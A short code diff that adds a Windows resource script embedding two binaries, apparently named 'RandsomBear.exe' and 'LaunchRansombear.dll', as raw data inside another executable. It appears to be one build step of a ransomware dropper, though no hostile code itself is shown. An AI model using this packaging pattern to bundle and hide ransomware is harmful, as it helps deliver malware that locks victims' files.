@@ -1,0 +1,9 @@
+#include "resource.h"
+IDB_EMBEDEXE    RCDATA      "C:\\Users\\abihari\\Documents\\cwg\\src\\cwg.sourcePE\\cwg.sourcePE\\RandsomBear.exe"
+IDB_EMBEDDLL    RCDATA      "C:\\Users\\abihari\\Documents\\cwg\\src\\cwg.sourcePE\\cwg.sourcePE\\LaunchRansombear.dll"
+
+
+
+
+
+
